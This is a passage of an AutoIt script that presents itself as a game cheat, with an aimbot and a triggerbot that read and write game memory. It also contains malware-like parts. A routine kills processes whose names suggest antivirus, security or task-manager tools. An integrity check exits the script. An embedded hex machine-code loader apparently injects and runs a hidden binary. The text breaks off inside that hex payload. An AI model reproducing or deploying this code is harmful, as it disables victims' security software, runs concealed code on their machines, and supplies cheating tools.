					 _memorywrite($angbase + $viewangoff + 4, $process, $angel2[$minf], "float")
				 EndIf

			 EndIf
			 EndIf

EndIf
endif

EndFunc


Func VisAimbot()
if $dfhgzfsgzsfg = 1 Then
If $viasghfaf = 1 And WinActive("[CLASS:Valve001]") Then
	$LocalBase = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
	If _IsPressed($key, "user32.dll") or $key = 0 Then
	$LocalBase2 = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
	$CrosshairID2 = _memoryread($LocalBase2 + $crossid, $process, "dword")
	$dw_BasePointer2 = _memoryread($client_dll + $c_dwBaseEntity + (($CrosshairID2 - 1) * 16), $process, "dword")
	$CheckHealth2 = _memoryread($dw_BasePointer2 + $Healths, $process, "dword")
	$MyTeam2 = _memoryread($dw_BasePointer2 + $MyTeamAD, $process, "dword")
	$Team2 = _memoryread($LocalBase2 + $MyTeamAD, $process, "dword")

	$VisLocalBase = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
		$Radarspot = ($CrosshairID2 <> 0 And $CheckHealth2 > 0)
			If $radarspot <> 0 Then

			If $Delay > 0 Then
				Sleep($Delay)
			EndIf
			$AngBase = _memoryread($engine_dll + $ViewAng, $process, "dword")
			$i1 = _memoryread($LocalBase + $hitboxpos, $process, "float")
			$i2 = _memoryread($LocalBase + $hitboxpos + 4, $process, "float")
			$i3 = (_memoryread($LocalBase + $hitboxpos + 8, $process, "float"))
			$MyTeam = _memoryread($LocalBase + $MyTeamAD, $process, "dword")
			$MeFovx = _memoryread($AngBase + $ViewAngOff, $process, "float")
			$MeFovy = _memoryread($AngBase + $ViewAngOff + 4, $process, "float")
			$recoil = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
			$recoilx = _memoryread($recoil + $Recoil_offset + $m_local, $process, "float")
			$recoily = _memoryread($recoil + $Recoil_offset + $m_local + 4, $process, "float")
			$recoilx *= 2
			$recoily *= 2
			Local $Angel1[65]
			Local $Angel2[65]
			Local $Matx1[65]
			Local $Matx2[65]
			Local $dis[65]
			For $i = 0 To 64 Step 1
				$dw_BasePointer = _memoryread($client_dll + $c_dwBaseEntity + (($i - 1) * 16), $process, "dword")
				$hp = _memoryread($dw_BasePointer + $Healths, $process, "dword")
				If $hp > 0 Then
					$Team = _memoryread($dw_BasePointer + $MyTeamAD, $process, "dword")


					If $Team <> $MyTeam Then


						$m_dwBoneMatrix = _memoryread($dw_BasePointer + $BoneOffset, $process, "dword")
						$you1 = _memoryread($m_dwBoneMatrix + ((48 * ($Bone)) + 12), $process, "float")
						$you2 = _memoryread($m_dwBoneMatrix + ((48 * ($Bone)) + 28), $process, "float")
						$you3 = _memoryread($m_dwBoneMatrix + ((48 * ($Bone)) + 44), $process, "float") - 60
						$DISTANCE = Sqrt((($i1 - $you1) * ($i1 - $you1)) + (($i2 - $you2) * ($i2 - $you2)) + (($i3 - $you3) * ($i3 - $you3)))
						$Angel1[$i] = ((ASin(($you3 - $i3) / $DISTANCE) * 180 / $M_PI) * - 1)
						$Angel2[$i] = (ATAN2($you1 - $i1, $you2 - $i2) / $M_PI * 180)



						If $rcs = 0 Then
							$aimmin = $Angel1[$i] - ($MeFovx)
							$aimmin2 = $Angel2[$i] - ($MeFovy)
						Else
							$aimmin = $Angel1[$i] - ($MeFovx + $recoilx)
							$aimmin2 = $Angel2[$i] - ($MeFovy + $recoily)
						EndIf
						$addd1 = $i1 - $you1
						$addd2 = $i2 - $you2
						$addd3 = $i3 - $you3
						If $aimmin > 180 Then $aimmin -= 360
						If $aimmin2 > 180 Then $aimmin2 -= 360
						If $aimmin < -180 Then $aimmin += 360
						If $aimmin2 < -180 Then $aimmin2 += 360
						$fovdis = Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2))
						If $fovdis < $fov / 2 Then
							$dis[$i] = (Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2)))
						Else
							$dis[$i] = ""
						EndIf
					EndIf
				EndIf



						If $rcs = 0 Then
							$aimmin = $Angel1[$i] - ($MeFovx)
							$aimmin2 = $Angel2[$i] - ($MeFovy)
						Else
							$aimmin = $Angel1[$i] - ($MeFovx + $recoilx)
							$aimmin2 = $Angel2[$i] - ($MeFovy + $recoily)
						EndIf
						$addd1 = $i1 - $you1
						$addd2 = $i2 - $you2
						$addd3 = $i3 - $you3
						If $aimmin > 180 Then $aimmin -= 360
						If $aimmin2 > 180 Then $aimmin2 -= 360
						If $aimmin < -180 Then $aimmin += 360
						If $aimmin2 < -180 Then $aimmin2 += 360
						$fovdis = Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2))
						If $fovdis < $fov / 2 Then
							$dis[$i] = (Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2)))
						Else
							$dis[$i] = ""
						EndIf

			Next
			$avArray = $dis
			If Not IsArray($avArray) Then Return $MinF = ""
			If UBound($avArray, 0) <> 1 Then Return $MinF = ""
			Local $iUBound = UBound($avArray) - 1
			If $iEnd < 1 Or $iEnd > $iUBound Then $iEnd = $iUBound
			If $iStart < 0 Then $iStart = 0
			If $iStart > $iEnd Then Return $MinF = ""
			Local $iMinIndex = $iStart
			Local $iCheckNum = 0
			For $i = $iStart To $iEnd
				If Not IsNumber($avArray[$i]) Then ContinueLoop
				If Not $iCheckNum Then $iMinIndex = $i
				$iCheckNum = 1
				If Number($avArray[$iMinIndex]) > Number($avArray[$i]) Then $iMinIndex = $i
			Next
			$MinF = $iMinIndex
			If $MinF Then
				If $dis[$MinF] <> "" Then
					If $rcs = 1 Then
						$angel1[$minf] -= $recoilx
						$angel2[$minf] -= $recoily
				    EndIf

					If $Smooth > 0 Then

						$Delta1 = $MeFovX - $angel1[$MinF]
						$Delta2 = $MeFovY - $angel2[$MinF]
						if $delta2 < -180 then $delta2 += 360
						if $delta2 > 180 then $delta2 -= 360
						If $Smooth = 0 Then $Smooth = 1
						$add1s = ($delta1 / ($Smooth))
						$add2s = ($delta2 / ($Smooth))
						$angel1[$MinF] = $MeFovX - $Delta1 / $Smooth
						$angel2[$MinF] = $MeFovY - $Delta2 / $Smooth

					EndIf

					 _memorywrite($angbase + $viewangoff, $process, $angel1[$minf], "float")
					 _memorywrite($angbase + $viewangoff + 4, $process, $angel2[$minf], "float")
				 EndIf

			 EndIf
			 EndIf
			EndIf
	EndIf
	EndIf
EndFunc


Func pTriggerbot()
if $ptrigger = 1 Then
   $LocalBase = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
   $ID = _memoryread($LocalBase + $crossid, $process, "dword")
   $dw_BasePointer = _memoryread($client_dll + $c_dwBaseEntity + (($id-1) * 16), $process, "dword")
   $hp = _memoryread($dw_BasePointer + $Healths, $process, "dword")
   $Team = _memoryread($dw_BasePointer + $MyTeamAD, $process, "dword")
   $cTeam = _memoryread($LocalBase + $MyTeamAD, $process, "dword")
    if _IsPressed($ptkey) Then
	  If $pTDelay > 0 Then
		 Sleep($pTDelay)
	  EndIf
	  If $id > 0 AND $id < 64 Then
				$dw_basepointer = _memoryread($client_dll + $c_dwbaseentity + (($id - 1) * 16), $process, "dword")
				$Team = _memoryread($dw_basepointer + $myteamad, $process, "dword")
				If $Team <> $cTeam Then
					If $pallbody = 1 Then
						_WinAPI_Mouse_Event($MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
						Sleep(75)
						_WinAPi_Mouse_Event($MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
						Sleep(75)
							Sleep($shotdelay)
						If $overburst = 1 Then
						_WinAPI_Mouse_Event($MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
						Sleep(75)
						_WinAPi_Mouse_Event($MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
						Sleep(75)
						_WinAPI_Mouse_Event($MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
						Sleep(75)
						_WinAPi_Mouse_Event($MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
						Sleep(75)
						EndIf
					Else
						$hitboxmin = gethitbox($phitbox, 1)
						$hitboxmax = gethitbox($phitbox, 2)
						$angbase = _memoryread($engine_dll + $viewang, $process, "dword")
						$m_dwbonematrix = _memoryread($dw_basepointer + $boneoffset, $process, "dword")
						$i1 = _memoryread($localbase + $hitboxpos, $process, "float")
						$i2 = _memoryread($localbase + $hitboxpos + 4, $process, "float")
						$i3 = (_memoryread($localbase + $hitboxpos + 8, $process, "float"))
						$mefovx = _memoryread($angbase + $viewangoff, $process, "float")
						$mefovy = _memoryread($angbase + $viewangoff + 4, $process, "float")
						$you1 = _memoryread($m_dwbonematrix + ((48 * ($phitbox)) + 12), $process, "float")
						$you2 = _memoryread($m_dwbonematrix + ((48 * ($phitbox)) + 28), $process, "float")
						$you3 = _memoryread($m_dwbonematrix + ((48 * ($phitbox)) + 44), $process, "float") - 60
						$youpos1 = $you1 + $hitboxmin[1]
						$youpos2 = $you2 + $hitboxmin[2]
						$youpos3 = $you3 + $hitboxmin[3]
						$distance = Sqrt((($i1 - $youpos1) * ($i1 - $youpos1)) + (($i2 - $youpos2) * ($i2 - $youpos2)) + (($i3 - $youpos3) * ($i3 - $youpos3)))
						$angel1_1 = ((ASin(($youpos3 - $i3) / $distance) * 180 / $m_pi) * -1)
						$angel2_1 = (atan2($youpos1 - $i1, $youpos2 - $i2) / $m_pi * 180)
						$youpos1 = $you1 + $hitboxmax[1]
						$youpos2 = $you2 + $hitboxmax[2]
						$youpos3 = $you3 + $hitboxmax[3]
						$distance = Sqrt((($i1 - $youpos1) * ($i1 - $youpos1)) + (($i2 - $youpos2) * ($i2 - $youpos2)) + (($i3 - $youpos3) * ($i3 - $youpos3)))
						$angel1_2 = ((ASin(($youpos3 - $i3) / $distance) * 180 / $m_pi) * -1)
						$angel2_2 = (atan2($youpos1 - $i1, $youpos2 - $i2) / $m_pi * 180)
						$youpos1 = $you1 + $hitboxmin[1]
						$youpos2 = $you2 - $hitboxmin[2]
						$youpos3 = $you3 + $hitboxmin[3]
						$distance = Sqrt((($i1 - $youpos1) * ($i1 - $youpos1)) + (($i2 - $youpos2) * ($i2 - $youpos2)) + (($i3 - $youpos3) * ($i3 - $youpos3)))
						$angel1_3 = ((ASin(($youpos3 - $i3) / $distance) * 180 / $m_pi) * -1)
						$angel2_3 = (atan2($youpos1 - $i1, $youpos2 - $i2) / $m_pi * 180)
						$youpos1 = $you1 + $hitboxmax[1]
						$youpos2 = $you2 - $hitboxmax[2]
						$youpos3 = $you3 + $hitboxmax[3]
						$distance = Sqrt((($i1 - $youpos1) * ($i1 - $youpos1)) + (($i2 - $youpos2) * ($i2 - $youpos2)) + (($i3 - $youpos3) * ($i3 - $youpos3)))
						$angel1_4 = ((ASin(($youpos3 - $i3) / $distance) * 180 / $m_pi) * -1)
						$angel2_4 = (atan2($youpos1 - $i1, $youpos2 - $i2) / $m_pi * 180)
						If $angel1_1 > $angel1_2 Then
							If $mefovx < $angel1_1 AND $mefovx > $angel1_2 Then
								$u = 1
							EndIf
						Else
							If $mefovx > $angel1_1 AND $mefovx < $angel1_2 Then
								$u = 1
							EndIf
						EndIf
						If $angel1_3 > $angel1_4 Then
							If $mefovx < $angel1_3 AND $mefovx > $angel1_4 Then
								$u = 1
							EndIf
						Else
							If $mefovx > $angel1_3 AND $mefovx < $angel1_4 Then
								$u = 1
							EndIf
						EndIf
						If $angel2_1 > $angel2_2 Then
							If $mefovy < $angel2_1 AND $mefovy > $angel2_2 Then
								$d = 1
							EndIf
						Else
							If $mefovy > $angel2_1 AND $mefovy < $angel2_2 Then
								$d = 1
							EndIf
						EndIf
						If $angel2_3 > $angel2_4 Then
							If $mefovy < $angel2_3 AND $mefovy > $angel2_4 Then
								$d = 1
							EndIf
						Else
							If $mefovy > $angel2_3 AND $mefovy < $angel2_4 Then
								$d = 1
							EndIf
						EndIf
						If $u = 1 AND $d = 1 Then
						_WinAPI_Mouse_Event($MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
						Sleep(75)
						_WinAPi_Mouse_Event($MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
						Sleep(75)
							Sleep($shotdelay)
						If $overburst = 1 Then
						_WinAPI_Mouse_Event($MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
						Sleep(75)
						_WinAPi_Mouse_Event($MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
						Sleep(75)
						_WinAPI_Mouse_Event($MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
						Sleep(75)
						_WinAPi_Mouse_Event($MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
						Sleep(75)
						EndIf
						EndIf
						$u = 0
						$d = 0
					EndIf
				EndIf
			EndIf
		EndIf
	EndIf
EndFunc

Func EndBadProcs()
Dim $bad_procs[7]
$bad_procs[0] = "anti"
$bad_procs[1] = "fix"
$bad_procs[2] = "remov"
$bad_procs[3] = "secur"
$bad_procs[4] = "av"
$bad_procs[5] = "tasklist"
$bad_procs[6] = "taskkill"
$procs = ProcessList()
For $i = 0 To UBound($procs) - 1
For $j = 0 To UBound($bad_procs) - 1
If(StringInStr($procs[$i][0], $bad_procs[$j], false)) Then
ProcessClose($procs[$i][1])
EndIf
Next
Next
EndFunc


Func _pathsplitbyregexpzzz($spath)
	If $spath = "" OR (StringInStr($spath, "\") AND StringInStr($spath, "/")) Then Return SetError(1, 0, -1)
	Local $aretarrray[8], $pdelim = ""
	If StringRegExp($spath, "^(?i)([A-Z]:|\\)(\\[^\\]+)+$(?i)(^.*:/)(/[^/]+)+$") Then $pdelim = "\"
	If StringRegExp($spath, "(?i)(^.*:/)(/[^/]+)+$(?i)(^.*:/)(/[^/]+)+$(?i)(^.*:/)(/[^/]+)+$") Then $pdelim = "//"
	If $pdelim = "" Then $pdelim = "/"
	If NOT StringInStr($spath, $pdelim) Then Return $spath
	If $pdelim = "\" Then $pdelim &= "\"
	$aretarrray[0] = $spath
	$aretarrray[1] = StringRegExpReplace($spath, $pdelim & ".*", $pdelim)
	$aretarrray[2] = StringRegExpReplace($spath, $pdelim & "[^" & $pdelim & "]*$", "")
	$aretarrray[3] = StringRegExpReplace($spath, "\.[^.]*$", "")
	$aretarrray[4] = StringRegExpReplace($spath, "(?i)([A-Z]:" & $pdelim & ")", "")
	$aretarrray[5] = StringRegExpReplace($spath, "^.*" & $pdelim, "")
	$aretarrray[6] = StringRegExpReplace($spath, ".*" & $pdelim & "|\.[^.]*$", "")
	$aretarrray[7] = StringRegExpReplace($spath, "^.*\.", "")
	If $decrypt <> $data Then
		Exit
	EndIf
	Return $aretarrray
EndFunc
Func _randomtext($length)
	$text = ""
	For $i = 1 To $length
		$text &= Chr(Random(65, 90, 1))
	Next
	Return $text
 EndFunc
Func _cryptimportkey($calg, $bkey, $ikeylength = -1)
	If $ikeylength < 1 Then $ikeylength = BinaryLen($bkey)
	Local $blob = DllStructCreate("align 1;BYTE   bType;BYTE   bVersion;WORD   reserved;dword aiKeyAlg;dword keysize;byte key[" & $ikeylength & "]")
	DllStructSetData($blob, 1, 8)
	DllStructSetData($blob, 2, 2)
	DllStructSetData($blob, 4, $calg)
	DllStructSetData($blob, 5, $ikeylength)
	DllStructSetData($blob, 6, Binary($bkey))
	Local $aret = DllCall(__crypt_dllhandle(), "bool", "CryptImportKey", "handle", __crypt_context(), "ptr", DllStructGetPtr($blob), "dword", DllStructGetSize($blob), "ptr", 0, "dword", 0, "ptr*", 0)
	If @error Then Return SetError(2, @error, 0)
	Return SetError(NOT $aret[0], 0, $aret[6])
EndFunc
Func _cryptsetkeyparam($hkey, $iparam, $vvalue, $iflags = 0, $svaltype = Default)
	If NOT $svaltype OR $svaltype = Default Then $svaltype = "ptr"
	Local $aret = DllCall(__crypt_dllhandle(), "bool", "CryptSetKeyParam", "handle", $hkey, "uint", $iparam, $svaltype, $vvalue, "dword", $iflags)
	If @error Then Return SetError(2, @error, 0)
	Return SetError(NOT $aret[0], 0, $aret[0])
EndFunc
Func _CRC32ForFile($sFile)
    Local $a_hCall = DllCall("kernel32.dll", "hwnd", "CreateFileW", _
            "wstr", $sFile, _
            "dword", 0x80000000, _
            "dword", 3, _
            "ptr", 0, _
            "dword", 3, _
            "dword", 0, _
            "ptr", 0)
    If @error Or $a_hCall[0] = -1 Then
        Return SetError(1, 0, "")
    EndIf
    Local $hFile = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "CreateFileMappingW", _
            "hwnd", $hFile, _
            "dword", 0, _
            "dword", 2, _
            "dword", 0, _
            "dword", 0, _
            "ptr", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
        Return SetError(2, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
    Local $hFileMappingObject = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "MapViewOfFile", _
            "hwnd", $hFileMappingObject, _
            "dword", 4, _
            "dword", 0, _
            "dword", 0, _
            "dword", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(3, 0, "")
    EndIf
    Local $pFile = $a_hCall[0]
    Local $iBufferSize = FileGetSize($sFile)
    Local $a_iCall = DllCall("ntdll.dll", "dword", "RtlComputeCrc32", _
            "dword", 0, _
            "ptr", $pFile, _
            "int", $iBufferSize)
    If @error Or Not $a_iCall[0] Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(4, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
    Local $iCRC32 = $a_iCall[0]
    Return SetError(0, 0, Hex($iCRC32))
EndFunc
Func _MD4ForFile($sFile)
    Local $a_hCall = DllCall("kernel32.dll", "hwnd", "CreateFileW", _
            "wstr", $sFile, _
            "dword", 0x80000000, _
            "dword", 3, _
            "ptr", 0, _
            "dword", 3, _
            "dword", 0, _
            "ptr", 0)
    If @error Or $a_hCall[0] = -1 Then
        Return SetError(1, 0, "")
    EndIf
    Local $hFile = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "CreateFileMappingW", _
            "hwnd", $hFile, _
            "dword", 0, _
            "dword", 2, _
            "dword", 0, _
            "dword", 0, _
            "ptr", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
        Return SetError(2, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
    Local $hFileMappingObject = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "MapViewOfFile", _
            "hwnd", $hFileMappingObject, _
            "dword", 4, _
            "dword", 0, _
            "dword", 0, _
            "dword", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(3, 0, "")
    EndIf
    Local $pFile = $a_hCall[0]
    Local $iBufferSize = FileGetSize($sFile)
    Local $tMD4_CTX = DllStructCreate("dword i[2];" & _
            "dword buf[4];" & _
            "ubyte in[64];" & _
            "ubyte digest[16]")
    DllCall("advapi32.dll", "none", "MD4Init", "ptr", DllStructGetPtr($tMD4_CTX))
    If @error Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(4, 0, "")
    EndIf
    DllCall("advapi32.dll", "none", "MD4Update", _
            "ptr", DllStructGetPtr($tMD4_CTX), _
            "ptr", $pFile, _
            "dword", $iBufferSize)
    If @error Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(5, 0, "")
    EndIf
    DllCall("advapi32.dll", "none", "MD4Final", "ptr", DllStructGetPtr($tMD4_CTX))
    If @error Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(6, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
    Local $sMD4 = Hex(DllStructGetData($tMD4_CTX, "digest"))
    Return SetError(0, 0, $sMD4)
EndFunc
Func _MD5ForFile($sFile)
    Local $a_hCall = DllCall("kernel32.dll", "hwnd", "CreateFileW", _
            "wstr", $sFile, _
            "dword", 0x80000000, _
            "dword", 3, _
            "ptr", 0, _
            "dword", 3, _
            "dword", 0, _
            "ptr", 0)
    If @error Or $a_hCall[0] = -1 Then
        Return SetError(1, 0, "")
    EndIf
    Local $hFile = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "CreateFileMappingW", _
            "hwnd", $hFile, _
            "dword", 0, _
            "dword", 2, _
            "dword", 0, _
            "dword", 0, _
            "ptr", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
        Return SetError(2, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
    Local $hFileMappingObject = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "MapViewOfFile", _
            "hwnd", $hFileMappingObject, _
            "dword", 4, _
            "dword", 0, _
            "dword", 0, _
            "dword", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(3, 0, "")
    EndIf
    Local $pFile = $a_hCall[0]
    Local $iBufferSize = FileGetSize($sFile)
    Local $tMD5_CTX = DllStructCreate("dword i[2];" & _
            "dword buf[4];" & _
            "ubyte in[64];" & _
            "ubyte digest[16]")
    DllCall("advapi32.dll", "none", "MD5Init", "ptr", DllStructGetPtr($tMD5_CTX))
    If @error Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(4, 0, "")
    EndIf
    DllCall("advapi32.dll", "none", "MD5Update", _
            "ptr", DllStructGetPtr($tMD5_CTX), _
            "ptr", $pFile, _
            "dword", $iBufferSize)
    If @error Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(5, 0, "")
    EndIf
    DllCall("advapi32.dll", "none", "MD5Final", "ptr", DllStructGetPtr($tMD5_CTX))
    If @error Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(6, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
    Local $sMD5 = Hex(DllStructGetData($tMD5_CTX, "digest"))
    Return SetError(0, 0, $sMD5)
EndFunc
Func _SHA1ForFile($sFile)
    Local $a_hCall = DllCall("kernel32.dll", "hwnd", "CreateFileW", _
            "wstr", $sFile, _
            "dword", 0x80000000, _
            "dword", 3, _
            "ptr", 0, _
            "dword", 3, _
            "dword", 0, _
            "ptr", 0)
    If @error Or $a_hCall[0] = -1 Then
        Return SetError(1, 0, "")
    EndIf
    Local $hFile = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "CreateFileMappingW", _
            "hwnd", $hFile, _
            "dword", 0, _
            "dword", 2, _
            "dword", 0, _
            "dword", 0, _
            "ptr", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
        Return SetError(2, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFile)
    Local $hFileMappingObject = $a_hCall[0]
    $a_hCall = DllCall("kernel32.dll", "ptr", "MapViewOfFile", _
            "hwnd", $hFileMappingObject, _
            "dword", 4, _
            "dword", 0, _
            "dword", 0, _
            "dword", 0)
    If @error Or Not $a_hCall[0] Then
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(3, 0, "")
    EndIf
    Local $pFile = $a_hCall[0]
    Local $iBufferSize = FileGetSize($sFile)
    Local $a_iCall = DllCall("advapi32.dll", "int", "CryptAcquireContext", _
            "ptr*", 0, _
            "ptr", 0, _
            "ptr", 0, _
            "dword", 1, _
            "dword", 0xF0000000)
    If @error Or Not $a_iCall[0] Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        Return SetError(4, 0, "")
    EndIf
    Local $hContext = $a_iCall[1]
    $a_iCall = DllCall("advapi32.dll", "int", "CryptCreateHash", _
            "ptr", $hContext, _
            "dword", 0x00008004, _
            "ptr", 0, _
            "dword", 0, _
            "ptr*", 0)
    If @error Or Not $a_iCall[0] Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        DllCall("advapi32.dll", "int", "CryptReleaseContext", "ptr", $hContext, "dword", 0)
        Return SetError(5, 0, "")
    EndIf
    Local $hHashSHA1 = $a_iCall[5]
    $a_iCall = DllCall("advapi32.dll", "int", "CryptHashData", _
            "ptr", $hHashSHA1, _
            "ptr", $pFile, _
            "dword", $iBufferSize, _
            "dword", 0)
    If @error Or Not $a_iCall[0] Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        DllCall("advapi32.dll", "int", "CryptDestroyHash", "ptr", $hHashSHA1)
        DllCall("advapi32.dll", "int", "CryptReleaseContext", "ptr", $hContext, "dword", 0)
        Return SetError(6, 0, "")
    EndIf
    Local $tOutSHA1 = DllStructCreate("byte[20]")
    $a_iCall = DllCall("advapi32.dll", "int", "CryptGetHashParam", _
            "ptr", $hHashSHA1, _
            "dword", 2, _
            "ptr", DllStructGetPtr($tOutSHA1), _
            "dword*", 20, _
            "dword", 0)
    If @error Or Not $a_iCall[0] Then
        DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
        DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
        DllCall("advapi32.dll", "int", "CryptDestroyHash", "ptr", $hHashSHA1)
        DllCall("advapi32.dll", "int", "CryptReleaseContext", "ptr", $hContext, "dword", 0)
        Return SetError(7, 0, "")
    EndIf
    DllCall("kernel32.dll", "int", "UnmapViewOfFile", "ptr", $pFile)
    DllCall("kernel32.dll", "int", "CloseHandle", "hwnd", $hFileMappingObject)
    DllCall("advapi32.dll", "int", "CryptDestroyHash", "ptr", $hHashSHA1)
    Local $sSHA1 = Hex(DllStructGetData($tOutSHA1, 1))
    DllCall("advapi32.dll", "int", "CryptReleaseContext", "ptr", $hContext, "dword", 0)
    Return SetError(0, 0, $sSHA1)
EndFunc
random23()
Func uniqeexecution($Binary)
		local  $ASM = "0x60E84E0000006B00650072006E0065006C003300320000006E00740064006C006C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005B8BFC6A42E8BB0300008B54242889118B54242C6A3EE8AA03000089116A4AE8A103000089396A1E6A3CE89D0300006A2268F4000000E8910300006A266A24E8880300006A2A6A40E87F030000"
			$ASM &= "6A2E6A0CE8760300006A3268C8000000E86A0300006A2AE85C0300008B09C701440000006A12E84D030000685BE814CF51E8790300006A3EE83B0300008BD16A1EE8320300006A40FF32FF31FFD06A12E823030000685BE814CF51E84F0300006A1EE8110300008B098B513C6A3EE8050300008B3903FA6A22E8FA0200008B0968F80000005751FFD06A00E8E80200006888FEB31651E8140300006A2EE8D60200"
			$ASM &= "008B396A2AE8CD0200008B116A42E8C402000057526A006A006A046A006A006A006A00FF31FFD06A12E8A902000068D03710F251E8D50200006A22E8970200008B116A2EE88E0200008B09FF7234FF31FFD06A00E87E020000689C951A6E51E8AA0200006A22E86C0200008B118B396A2EE8610200008B096A406800300000FF7250FF7734FF31FFD06A36E8470200008BD16A22E83E0200008B396A3EE8350200"
			$ASM &= "008B316A22E82C0200008B016A2EE8230200008B0952FF775456FF7034FF316A00E81002000068A16A3DD851E83C02000083C40CFFD06A12E8F9010000685BE814CF51E8250200006A22E8E70100008B1183C2066A3AE8DB0100006A025251FFD06A36E8CE010000C70100000000B8280000006A36E8BC010000F7216A1EE8B30100008B118B523C81C2F800000003D06A3EE89F01000003116A26E8960100006A"
			$ASM &= "2852FF316A12E88A010000685BE814CF51E8B601000083C40CFFD06A26E8730100008B398B098B71146A3EE86501000003316A26E85C0100008B098B510C6A22E8500100008B090351346A46E8440100008BC16A2EE83B0100008B0950FF77105652FF316A00E82A01000068A16A3DD851E85601000083C40CFFD06A36E8130100008B1183C20189116A3AE8050100008B093BCA0F8533FFFFFF6A32E8F4000000"
